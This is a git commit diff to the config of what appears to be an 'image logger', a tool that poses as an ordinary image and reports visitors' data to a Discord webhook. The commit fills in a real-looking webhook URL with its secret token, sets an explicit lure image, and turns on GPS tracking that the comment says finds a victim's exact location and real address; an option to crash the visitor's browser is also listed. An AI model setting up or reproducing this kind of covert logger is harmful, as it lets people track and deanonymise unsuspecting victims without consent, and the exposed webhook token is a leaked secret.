c4bd24ab3478f49859cc4e7523b697e784f0dec6
nicklas2008 <51957191+nicklas2008@users.noreply.github.com>
2025-02-14 05:14:41 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1339811563401646090/xMOFMIsx6oDQbB9qh5QHsb4cXDjpByRgTl-1Jsw2h5sbfsKNOKNeMJV3Wvu6VVaJ1TC4",
+    "image": "https://image.spreadshirtmedia.net/image-server/v1/products/T1459A839PA4459PT28D159130772W9017H10000/views/1,width=378,height=378,appearanceId=839,backgroundColor=F2F2F2/penis-mandlige-symbol-aeg-taske-pik-sex-sexet.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
